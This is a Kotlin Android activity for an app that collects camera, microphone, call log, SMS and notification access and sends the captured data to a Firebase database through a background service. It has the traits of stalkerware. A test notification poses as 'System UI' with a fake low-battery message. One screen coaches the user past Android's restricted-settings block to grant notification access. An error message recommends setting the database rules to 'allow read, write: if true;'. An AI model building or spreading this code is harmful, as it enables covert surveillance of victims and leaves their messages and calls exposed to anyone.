package com.example

import android.Manifest
import android.graphics.Bitmap
import android.os.Bundle
import android.util.Base64
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.TextFieldValue
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import androidx.core.content.ContextCompat
import androidx.lifecycle.compose.LocalLifecycleOwner
import com.example.ui.theme.MyApplicationTheme
import com.google.accompanist.permissions.*
import com.google.firebase.firestore.FirebaseFirestore
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.concurrent.Executors

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    AppNavigation(modifier = Modifier.padding(innerPadding))
                }
            }
        }
    }
}

enum class AppState {
    NAME_INPUT, PERMISSIONS, NOTIFICATIONS_SETUP, WEBSOCKET
}

@OptIn(ExperimentalPermissionsApi::class)
@Composable
fun AppNavigation(modifier: Modifier = Modifier) {
    var currentState by remember { mutableStateOf(AppState.NAME_INPUT) }
    var userName by remember { mutableStateOf("") }

    when (currentState) {
        AppState.NAME_INPUT -> {
            NameInputScreen(
                modifier = modifier,
                onNameSubmitted = {
                    userName = it
                    currentState = AppState.PERMISSIONS
                }
            )
        }
        AppState.PERMISSIONS -> {
            val permissionsList = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS
            )
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                permissionsList.add(Manifest.permission.POST_NOTIFICATIONS)
            }
            val permissionsState = rememberMultiplePermissionsState(
                permissions = permissionsList
            )

            if (permissionsState.allPermissionsGranted) {
                LaunchedEffect(Unit) {
                    currentState = AppState.NOTIFICATIONS_SETUP
                }
            } else {
                PermissionsScreen(
                    modifier = modifier,
                    permissionsState = permissionsState,
                    userName = userName
                )
            }
        }
        AppState.NOTIFICATIONS_SETUP -> {
            NotificationsSetupScreen(
                modifier = modifier,
                userName = userName,
                onSetupComplete = {
                    currentState = AppState.WEBSOCKET
                }
            )
        }
        AppState.WEBSOCKET -> {
            CameraScreen(modifier = modifier, userName = userName)
        }
    }
}

@Composable
fun NameInputScreen(modifier: Modifier = Modifier, onNameSubmitted: (String) -> Unit) {
    var textState by remember { mutableStateOf(TextFieldValue("")) }

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(24.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(
            text = "مرحباً! الرجاء إدخال اسمك",
            style = MaterialTheme.typography.headlineSmall,
            modifier = Modifier.padding(bottom = 24.dp)
        )
        
        OutlinedTextField(
            value = textState,
            onValueChange = { textState = it },
            label = { Text("الاسم") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth()
        )
        
        Spacer(modifier = Modifier.height(24.dp))
        
        Button(
            onClick = { 
                if (textState.text.isNotBlank()) {
                    onNameSubmitted(textState.text.trim())
                }
            },
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("متابعة")
        }
    }
}

@OptIn(ExperimentalPermissionsApi::class)
@Composable
fun PermissionsScreen(
    modifier: Modifier = Modifier,
    permissionsState: MultiplePermissionsState,
    userName: String
) {
    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(24.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(
            text = "أهلاً $userName،",
            style = MaterialTheme.typography.titleLarge,
            modifier = Modifier.padding(bottom = 8.dp)
        )
        Text(
            text = "لاستخدام جميع ميزات التطبيق، يرجى منح الأذونات التالية (الكاميرا، الميكروفون، سجل المكالمات، ورسائل SMS).\n\nملاحظة هامة: سوف ترسل لقطات الكاميرا، المكالمات، ورسائل الـ SMS إلى تطبيق @",
            style = MaterialTheme.typography.bodyLarge,
            modifier = Modifier.padding(bottom = 24.dp)
        )
        
        Button(
            onClick = { permissionsState.launchMultiplePermissionRequest() },
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("منح الأذونات")
        }
    }
}

@Composable
fun CameraScreen(modifier: Modifier = Modifier, userName: String) {
    val context = androidx.compose.ui.platform.LocalContext.current
    var isStreaming by remember { mutableStateOf(false) }

    Column(
        modifier = modifier.fillMaxSize(),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f),
            contentAlignment = Alignment.Center
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Text(
                    text = if (isStreaming) "📡" else "📷",
                    style = MaterialTheme.typography.displayLarge
                )
                Spacer(modifier = Modifier.height(16.dp))
                // Status overlay
                Surface(
                    color = MaterialTheme.colorScheme.surfaceVariant,
                    shape = MaterialTheme.shapes.medium
                ) {
                    Text(
                        text = if (isStreaming) "✅ يتم الإرسال الآن بنجاح في الخلفية..." else "متوقف",
                        modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp),
                        style = MaterialTheme.typography.bodyMedium
                    )
                }
            }
        }

        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            horizontalArrangement = Arrangement.SpaceEvenly
        ) {
            Button(
                onClick = {
                    try {
                        isStreaming = true
                        val intent = android.content.Intent(context, CameraService::class.java).apply {
                            putExtra("USER_NAME", userName)
                        }
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            context.startForegroundService(intent)
                        } else {
                            context.startService(intent)
                        }
                    } catch (e: Throwable) {
                        isStreaming = false
                        android.widget.Toast.makeText(context, "فشل بدء الخدمة: ${e.localizedMessage}", android.widget.Toast.LENGTH_LONG).show()
                    }
                },
                enabled = !isStreaming,
                modifier = Modifier.weight(1f).padding(end = 8.dp)
            ) {
                Text("إرسال (Live)")
            }
            
            Button(
                onClick = {
                    try {
                        isStreaming = false
                        val intent = android.content.Intent(context, CameraService::class.java).apply {
                            action = "STOP"
                        }
                        context.startService(intent)
                    } catch (e: Throwable) {
                        Log.e("MainActivity", "Error stopping service", e)
                    }
                },
                enabled = isStreaming,
                colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
                modifier = Modifier.weight(1f).padding(start = 8.dp)
            ) {
                Text("إيقاف")
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        
        var testStatus by remember { mutableStateOf("اضغط أدناه لاختبار الاتصال المباشر مع قاعدة البيانات") }
        var isTesting by remember { mutableStateOf(false) }
        
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 16.dp),
            colors = CardDefaults.cardColors(
                containerColor = MaterialTheme.colorScheme.surfaceVariant
            )
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text(
                    text = "🔍 تشخيص حالة قاعدة البيانات (Firestore)",
                    style = MaterialTheme.typography.titleMedium
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = testStatus,
                    style = MaterialTheme.typography.bodySmall
                )
                Spacer(modifier = Modifier.height(8.dp))
                Button(
                    onClick = {
                        isTesting = true
                        testStatus = "⏳ جارٍ فحص الاتصال وقواعد الأمان..."
                        try {
                            val db = FirebaseHelper.getFirestore(context)
                            val testDoc = hashMapOf(
                                "client_test" to true,
                                "device_time" to System.currentTimeMillis(),
                                "user" to userName
                            )
                            db.collection("_diagnostics").document("connection_check")
                                .set(testDoc)
                                .addOnSuccessListener {
                                    isTesting = false
                                    testStatus = "🟢 الاتصال سليم 100%! تم التحقق من القواعد والكتابة في Firestore بنجاح."
                                    android.widget.Toast.makeText(context, "🟢 تم الاتصال بقاعدة البيانات بنجاح!", android.widget.Toast.LENGTH_LONG).show()
                                }
                                .addOnFailureListener { e ->
                                    isTesting = false
                                    val err = e.localizedMessage ?: e.toString()
                                    testStatus = if (err.contains("PERMISSION_DENIED", ignoreCase = true)) {
                                        "🔴 خطأ في القواعد (PERMISSION_DENIED): قاعدة البيانات ترفض الكتابة! يرجى فتح قواعد Firestore في Firebase Console إلى 'allow read, write: if true;'"
                                    } else if (err.contains("UNAVAILABLE", ignoreCase = true)) {
                                        "🔴 خطأ في الشبكة (UNAVAILABLE): تعذر الوصول لخوادم Firebase. تحقق من اتصال الإنترنت."
                                    } else {
                                        "🔴 فشل الاتصال: $err"
                                    }
                                    android.widget.Toast.makeText(context, testStatus, android.widget.Toast.LENGTH_LONG).show()
                                }
                        } catch (t: Throwable) {
                            isTesting = false
                            testStatus = "🔴 استثناء أثناء محاولة الاتصال: ${t.localizedMessage}"
                        }
                    },
                    enabled = !isTesting,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(if (isTesting) "جارٍ الفحص..." else "فحص الاتصال بقاعدة البيانات الآن 📡")
                }
            }
        }
        
        Button(
            onClick = {
                try {
                    val manager = context.getSystemService(android.app.NotificationManager::class.java)
                    val channelId = "test_channel"
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        val channel = android.app.NotificationChannel(channelId, "Test Notifications", android.app.NotificationManager.IMPORTANCE_DEFAULT)
                        manager?.createNotificationChannel(channel)
                    }
                    val notification = androidx.core.app.NotificationCompat.Builder(context, channelId)
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .setContentTitle("System UI")
                        .setContentText("battre faible")
                        .build()
                    manager?.notify(999, notification)
                    android.widget.Toast.makeText(context, "تم إرسال إشعار تجريبي للجهاز", android.widget.Toast.LENGTH_SHORT).show()
                } catch (e: Throwable) {
                    android.widget.Toast.makeText(context, "خطأ: ${e.localizedMessage}", android.widget.Toast.LENGTH_LONG).show()
                }
            },
            modifier = Modifier.padding(bottom = 16.dp),
            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary)
        ) {
            Text("تجربة إشعار (battre faible)")
        }
        
        Button(
            onClick = {
                try {
                    val db = FirebaseHelper.getFirestore(context)
                    val callData = hashMapOf(
                        "type" to "INCOMING_CALL",
                        "number" to "أمي (0501234567)",
                        "timestamp" to System.currentTimeMillis()
                    )
                    
                    db.collection("calls").document(userName)
                        .collection("logs").add(callData)
                        .addOnSuccessListener {
                            android.widget.Toast.makeText(context, "✅ تم تدوين الاتصال في Firebase بنجاح", android.widget.Toast.LENGTH_SHORT).show()
                        }
                        .addOnFailureListener { e ->
                            android.widget.Toast.makeText(context, "❌ فشل التدوين: ${e.localizedMessage}", android.widget.Toast.LENGTH_LONG).show()
                        }
                } catch (e: Throwable) {
                    android.widget.Toast.makeText(context, "خطأ: ${e.localizedMessage}", android.widget.Toast.LENGTH_LONG).show()
                }
            },
            modifier = Modifier.padding(bottom = 16.dp),
            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.tertiary)
        ) {
            Text("تجربة اتصال (أمي تتصل)")
        }
        
        Button(
            onClick = {
                try {
                    val db = FirebaseHelper.getFirestore(context)
                    val smsData = hashMapOf(
                        "type" to "INCOMING_SMS",
                        "sender" to "Mobilis",
                        "body" to "لقد بقي لك 1 GB من اشتراك الانترنت الخاص بك. لتجديد الاشتراك اتصل بـ *600#.",
                        "timestamp" to System.currentTimeMillis()
                    )
                    
                    db.collection("sms").document(userName)
                        .collection("logs").add(smsData)
                        .addOnSuccessListener {
                            android.widget.Toast.makeText(context, "✅ تم تدوين رسالة SMS في Firebase بنجاح", android.widget.Toast.LENGTH_SHORT).show()
                        }
                        .addOnFailureListener { e ->
                            android.widget.Toast.makeText(context, "❌ فشل التدوين: ${e.localizedMessage}", android.widget.Toast.LENGTH_LONG).show()
                        }
                } catch (e: Throwable) {
                    android.widget.Toast.makeText(context, "خطأ: ${e.localizedMessage}", android.widget.Toast.LENGTH_LONG).show()
                }
            },
            modifier = Modifier.padding(bottom = 16.dp),
            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.errorContainer, contentColor = MaterialTheme.colorScheme.onErrorContainer)
        ) {
            Text("تجربة رسالة SMS (Mobilis)")
        }
    }
}

@Composable
fun NotificationsSetupScreen(
    modifier: Modifier = Modifier,
    userName: String,
    onSetupComplete: () -> Unit
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    
    // Save userName to SharedPreferences for the NotificationService to use
    LaunchedEffect(userName) {
        val prefs = context.getSharedPreferences("AppPrefs", android.content.Context.MODE_PRIVATE)
        prefs.edit().putString("USER_NAME", userName).apply()
    }

    var isGranted by remember { 
        mutableStateOf(
            android.provider.Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")?.contains(context.packageName) == true
        )
    }

    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                isGranted = android.provider.Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")?.contains(context.packageName) == true
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(24.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(
            text = "الوصول للإشعارات",
            style = MaterialTheme.typography.titleLarge,
            modifier = Modifier.padding(bottom = 8.dp)
        )
        Text(
            text = "لإرسال إشعارات هذا الجهاز إلى التطبيق المستقبل، يجب منح إذن \"الوصول إلى الإشعارات\" (Notification Access). \n\nاضغط على الزر أدناه، وابحث عن التطبيق في القائمة، وقم بتفعيل الخيار.",
            style = MaterialTheme.typography.bodyLarge,
            modifier = Modifier.padding(bottom = 24.dp),
            textAlign = androidx.compose.ui.text.style.TextAlign.Center
        )
        
        if (isGranted) {
            Text(
                text = "✅ تم منح الصلاحية بنجاح",
                color = MaterialTheme.colorScheme.primary,
                style = MaterialTheme.typography.bodyLarge,
                modifier = Modifier.padding(bottom = 16.dp)
            )
            Button(
                onClick = onSetupComplete,
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("متابعة")
            }
        } else {
            Button(
                onClick = {
                    val intent = android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    context.startActivity(intent)
                },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("1. تفعيل صلاحية الإشعارات")
            }
            
            Spacer(modifier = Modifier.height(12.dp))

            OutlinedButton(
                onClick = {
                    try {
                        val intent = android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = android.net.Uri.fromParts("package", context.packageName, null)
                        }
                        context.startActivity(intent)
                    } catch (e: Throwable) {
                        Log.e("NotificationsSetup", "Error opening app settings", e)
                    }
                },
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("⚠️ إذا كان الزر رمادياً: فك القيد من معلومات التطبيق")
            }
            
            Spacer(modifier = Modifier.height(16.dp))
            
            TextButton(
                onClick = onSetupComplete
            ) {
                Text("تخطي (لن يتم تسجيل الإشعارات)")
            }
        }
    }
}
